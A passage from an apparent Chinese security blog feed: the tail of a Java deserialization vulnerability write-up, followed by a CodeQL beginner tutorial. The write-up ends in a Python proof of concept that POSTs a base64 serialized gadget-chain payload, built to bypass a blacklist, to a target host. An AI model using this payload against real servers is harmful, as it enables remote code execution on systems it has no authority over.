0q7BdcEkmv3Qo8sklumoYnEEw9UoWW03/ijNq3FOjJI3O9HkjbINJwoXNfh0M2XBa1gJG3CS8VXfTHWlASRRo2hxC24EKaiEMbEUQhlAIrY+Kc2Nz56MWH4LkROhIaulXE1UzcMaK3LW1rrubaYaKqm+qtYVb0UtODQhh8hUT9Omp4WgL5Dg/9tavrei3iZ1fUePPDd/V7iUSsfW7+awNvWMKefzq+8HfMJzujvd+60Y5tKIa4vyIn4sivOCWmVudINzcHSwmtPPfWrlb/p+zM8P2xYcdq0FqNFQNDXaxceluPoNFfBgajs8+f+UvzMz3r0deHphyaBuG8eefXl700sflbjfnQT3OhwBX4NYPMCLhRiF9psAdpng6fn/tSB93/b1WYBWhcfgtbMujrPJImd/8MPfvxGhX8XBcJbRAJWORCTyllABUI9vAlde5Wlzv/zr/earh6JunokVcB9sq0YOq+n49ufgz//zw/Xych+0CFPtkMUB6jDgELGipeeDiolJj73+lcP97z89hfr0ikJMcqvfOCRIMOxrHFHdWXoN897Fz/+ioqtrrBPUKiHqvhJWi6cQbQk6eMDXiOnlqEgfTFn7G7KK/dTNz4pD2xDWkg39eXZb18crnrwNCF7ErrZ5OGci+V0GfoLq5TGIqi7DK9F18n3FWqj9YZBF6qB/FvbX/xUuPF2gAD+6BlJLm229TYmPh7a7Vyrc1rlP7l1XIX9wtVXftQ98/T/zuvtoUPL25RKlnu1GVdV+fiS/dPffGvq+196oF2iwxtsr2w8pu09Bl0JGzMWIM37xgr1IYAMvFXCHwh8Aw97Rug+Az+mk0qlLt/Twxt6qtnPydGD2c3iuAFx+mjD8J07GEGSvIA16ugx/aMIlCT8VSSnLyWwKWNVmbZ4gfPVwDt24rhjUW/MMM6eu5Q+A39nx86ev3zFmGCgJyCA54wp22VzzIOOLw+1zueugZcncFo2YBe5R09TOB85ZgD9NBfHT46TDZ42ZSN+UonPD/Kkmu3V8Gxq2aqHGW0wTkrhYWDoj9/6zr/vv3Q5GWGIOYbsFI2O1h+DELzTU+us6v8BnkMlL/YaAAA=&quot;</span></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    data = base64.b64decode(b)</span><br><span class="line"></span><br><span class="line">    headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, host, <span class="string">&quot;------存在漏洞！&quot;</span>)</span><br><span class="line">      <span class="comment">## print(&quot;[+]&quot;, res.text)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[o]&quot;</span>, host, <span class="string">&quot;------不存在漏洞！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd(<span class="string">&quot;http://localhost:8075&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/X1r0z/JNDIMap">https://github.com/X1r0z/JNDIMap</a></li><li><a href="https://github.com/7wkajk/Frchannel">https://github.com/7wkajk/Frchannel</a></li><li><a href="https://github.com/ax1sX/SecurityList">https://github.com/ax1sX/SecurityList</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。&lt;/p&gt;
&lt;h3 id=&quot;Hashtable链&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 基础</title>
    <link href="https://jaspersec.top/posts/3347678648.html"/>
    <id>https://jaspersec.top/posts/3347678648.html</id>
    <published>2024-07-01T10:31:53.000Z</published>
    <updated>2025-03-31T22:09:47.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CodeQL-概览"><a href="#CodeQL-概览" class="headerlink" title="CodeQL 概览"></a>CodeQL 概览</h2><p>CodeQL是一个静态代码分析引擎，用来给半自动化检查代码中可能存在的漏洞和bug。使用 CodeQL 进行代码审计包括下面三个步骤：</p><ol><li>从源代码中提取必备信息，然后创建 codeql 数据库</li><li>用他人编写好 or 自定义的 ql 语句进行查询</li><li>解释分析查询结果</li></ol><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>创建数据库通常使用固定的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /codeql-dbs/example-repo --language=&lt;language-label&gt; --source-root /checkouts/example-repo</span><br></pre></td></tr></table></figure><p>当然不同语言存在差异，可以以编译型 &#x2F; 非编译型进行区分，可以参考：<a href="https://docs.github.com/zh/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis">为 CodeQL 分析准备代码</a></p><h4 id="非编译型语言"><a href="#非编译型语言" class="headerlink" title="非编译型语言"></a>非编译型语言</h4><p>非编译型语言构成的项目，其数据库的构建方式通常比较简单，指定源码文件夹和输出文件夹即可。</p><p>Javascript 和 typescript 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript-typescript --source-root &lt;folder-to-extract&gt; &lt;output-folder&gt;/javascript-database</span><br></pre></td></tr></table></figure><p>Python 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=python &lt;output-folder&gt;/python-database</span><br></pre></td></tr></table></figure><p>Rubu 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=ruby --source-root &lt;folder-to-extract&gt; &lt;output-folder&gt;/ruby-database</span><br></pre></td></tr></table></figure><h4 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h4><p>编译型语言的数据库构建相对复杂，因为项目需要先进行编译，然后生成最终的项目，而不同的项目可以使用不同的构建工具进行管理，所以这一块比较复杂。</p><p>codeql-cli 提供了两种思路，一是自动识别进行数据库生成， 二是显式指定生成最终项目的命令，既项目构建的命令。</p><p>例如，自动构建 C++ &#x2F; C 项目的数据库的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=cpp &lt;output-folder&gt;/cpp-database</span><br></pre></td></tr></table></figure><p>而显式指定构建项目的命令来生成 C &#x2F; C++项目的数据库的命令如下，多一个参数而已：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create cpp-database --language=c-cpp --command=make</span><br></pre></td></tr></table></figure><p>显式指定构建命令生成 C## 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create csharp-database --language=csharp --command=&#x27;dotnet build /t:rebuild&#x27;</span><br></pre></td></tr></table></figure><p>显式 指定环境变量 &#x2F; 指定构建脚本 生成 Go 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go</span><br><span class="line"></span><br><span class="line">codeql database create go-database --language=go --command=&#x27;./scripts/build.sh&#x27;</span><br></pre></td></tr></table></figure><p>显示指定 maven 生成 Java 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create java-database --language=java-kotlin --command=&#x27;mvn clean install&#x27;</span><br></pre></td></tr></table></figure><p>显示指定 Ant 生成 Java 项目数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create java-database --language=java-kotlin --command=&#x27;ant -f build.xml&#x27;</span><br></pre></td></tr></table></figure><h3 id="执行查询"><a href="#执行查询" class="headerlink" title="执行查询"></a>执行查询</h3><p>创建完数据库之后，在 vscode 的插件里按文件夹导入，即可创建 ql 脚本，执行查询操作。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9e615ac872577ad8d2ec0cde0f94502a.png"></p><h3 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h3><p>类似 sql 查询，通过 运行 ql 语句进行查询操作，同时返回一个结果集，包含符合 ql 语句要求的代码片段。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/b70fb9bfc11b6534e91c06e6d9f045eb.png"></p><h2 id="CodeQL-快速入门"><a href="#CodeQL-快速入门" class="headerlink" title="CodeQL 快速入门"></a>CodeQL 快速入门</h2><p>首先是环境搭建，官方文档推荐使用 vscode extension，本质就是下面三步走：</p><ul><li>下载 codeql-cli 和 packs 的<a href="https://github.com/github/codeql-action/releases">捆绑包</a>，并配置好环境变量</li><li>vscode 安装 CodeQL 插件，并在 vscode extension settings 里配置好 codeql-cli 的路径</li><li>下载 <a href="https://github.com/github/vscode-codeql-starter/">vscode-codeql-starter workspace</a>，双击 <code>vscode-codeql-starter.code-workspace</code>打开 workspace</li></ul><h3 id="游戏例子"><a href="#游戏例子" class="headerlink" title="游戏例子"></a>游戏例子</h3><p>官方文档里，通过游戏例子帮助入门： <a href="https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/">https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/</a></p><p>例-01：find the thief</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> See https:<span class="operator">/</span><span class="operator">/</span>codeql.github.com<span class="operator">/</span>docs<span class="operator">/</span>writing<span class="operator">-</span>codeql<span class="operator">-</span>queries<span class="operator">/</span>ql<span class="operator">-</span>tutorials<span class="operator">/</span>#ql<span class="operator">-</span>tutorials.</span><br><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Person t</span><br><span class="line"><span class="keyword">where</span> t.getHeight() <span class="operator">&gt;</span> <span class="number">150</span></span><br><span class="line">    <span class="keyword">and</span> t.getHairColor() <span class="operator">!=</span> &quot;blond&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exists</span>( string c <span class="operator">|</span> t.getHairColor() <span class="operator">=</span> c)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> t.getAge() <span class="operator">&lt;</span> <span class="number">30</span></span><br><span class="line">    <span class="keyword">and</span> t.getLocation() <span class="operator">=</span> &quot;east&quot;</span><br><span class="line">    <span class="keyword">and</span> (t.getHairColor() <span class="operator">=</span> &quot;brown&quot; <span class="keyword">or</span> t.getHairColor() <span class="operator">=</span> &quot;black&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> (t.getHeight() <span class="operator">&gt;</span> <span class="number">180</span> <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="number">190</span>)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> forall(Person p <span class="operator">|</span> t.getAge() <span class="operator">&gt;</span> p.getAge())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">!=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span> <span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="built_in">avg</span>(Person p <span class="operator">|</span>  <span class="operator">|</span>p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span>p.getLocation()<span class="operator">=</span>&quot;east&quot;<span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getAge())</span><br><span class="line"><span class="keyword">select</span> t</span><br></pre></td></tr></table></figure><p>例-02：Catch the fire starter</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line">predicate isSouthern(Person p) &#123;</span><br><span class="line">    p.getLocation() <span class="operator">=</span> &quot;south&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isBald(Person p) &#123;</span><br><span class="line">    <span class="keyword">not</span> <span class="keyword">exists</span>(string c <span class="operator">|</span> p.getHairColor() <span class="operator">=</span> c )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Southerner extends Person &#123;</span><br><span class="line">    Southerner() &#123; isSouthern(this) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child extends Person&#123;</span><br><span class="line">    Child()&#123;this.getAge() <span class="operator">&lt;</span> <span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAllowedIn(string region) &#123;</span><br><span class="line">        region <span class="operator">=</span> this.getLocation()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Southerner s</span><br><span class="line"><span class="keyword">where</span> s.isAllowedIn(&quot;north&quot;) </span><br><span class="line">    <span class="keyword">and</span> isBald(s)</span><br><span class="line"><span class="keyword">select</span> s, s.getAge()</span><br></pre></td></tr></table></figure><p>例-03：Crown the rightful heir</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line">Person childOf(Person p) &#123;</span><br><span class="line">    p <span class="operator">=</span> parentOf(<span class="keyword">result</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person ancestorOf(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> parentOf(p) <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> parentOf(ancestorOf(p))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person relativeOf(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> childOf<span class="operator">*</span>(ancestorOf(p)) <span class="keyword">and</span> <span class="keyword">not</span> result.isDeceased()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person isATheif(Person t)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> t </span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&gt;</span> <span class="number">150</span></span><br><span class="line">    <span class="keyword">and</span> t.getHairColor() <span class="operator">!=</span> &quot;blond&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">exists</span>( string c <span class="operator">|</span> t.getHairColor() <span class="operator">=</span> c)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> t.getAge() <span class="operator">&lt;</span> <span class="number">30</span></span><br><span class="line">    <span class="keyword">and</span> t.getLocation() <span class="operator">=</span> &quot;east&quot;</span><br><span class="line">    <span class="keyword">and</span> (t.getHairColor() <span class="operator">=</span> &quot;brown&quot; <span class="keyword">or</span> t.getHairColor() <span class="operator">=</span> &quot;black&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> (t.getHeight() <span class="operator">&gt;</span> <span class="number">180</span> <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="number">190</span>)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> forall(Person p <span class="operator">|</span> t.getAge() <span class="operator">&gt;</span> p.getAge())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">!=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span> <span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t.getHeight() <span class="operator">&lt;</span> <span class="built_in">avg</span>(Person p <span class="operator">|</span>  <span class="operator">|</span>p.getHeight())</span><br><span class="line">    <span class="keyword">and</span> t <span class="operator">=</span> <span class="built_in">max</span>(Person p <span class="operator">|</span>p.getLocation()<span class="operator">=</span>&quot;east&quot;<span class="operator">|</span> p <span class="keyword">order</span> <span class="keyword">by</span> p.getAge())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person isAFireStarter(Person f)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> f </span><br><span class="line">    <span class="keyword">and</span> f.getLocation() <span class="operator">=</span> &quot;south&quot;</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> f.getAge() <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(string c <span class="operator">|</span> f.getHairColor() <span class="operator">=</span> c )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person hasCriminalRecord(Person p)&#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> isAFireStarter(p) <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> isATheif(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Person p</span><br><span class="line"><span class="keyword">where</span> p <span class="operator">=</span> relativeOf(&quot;King Basil&quot;)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">not</span> p <span class="operator">=</span> hasCriminalRecord(p)</span><br><span class="line"><span class="keyword">select</span> p <span class="operator">+</span> &quot; You are the next king!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例-04：Cross the river，这个偏算法思想，不看。</p><h3 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h3><p>以 java-sec-code 项目为例，创建数据库命令的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language=java --source-root=/Users/jasper/Documents/Security/java/java-sec-code --command=&quot;mvn clean package&quot;</span><br></pre></td></tr></table></figure><p>点侧栏点CodeQL插件，选Java -&gt; 导入上面创建的数据库 -&gt; 运行example.ql，能正常运行输出结果说明环境正常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a82ac657b9b2f45af73a256c789aad21.png"></p><p>再以 activemq 为例，注意 maven build 需要科学上网，源码是直接在 activmq GitHub clone 的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create .\codeql-databases\activemq --language=java-kotlin --source-root .\activemq-activemq-6.1.5\ --command=&#x27;mvn clean install -Dmaven.test.skip=true&#x27;</span><br></pre></td></tr></table></figure><p>编写查询，查找 activemq 项目里所有调用了 <code>.equals(&quot;&quot;)</code> 的函数，并且调用 该 <code>equals()</code> 的对象的类型应为  String</p><p>注意：官方文档上 MethodAccess 已经弃用，MethodAccess 改名为 MehtodCall，MehtodCall.getMethod()获取到的是被调用的函数，即 <code>callee</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MethodCall mc</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    mc.getMethod().hasName(&quot;equals&quot;) <span class="keyword">and</span></span><br><span class="line">    mc.getArgument(<span class="number">0</span>).(StringLiteral).getValue() <span class="operator">=</span> &quot;&quot; <span class="keyword">and</span></span><br><span class="line">    mc.getQualifier().getType() instanceof TypeString</span><br><span class="line"><span class="keyword">select</span> mc, &quot;This comparison to empty string 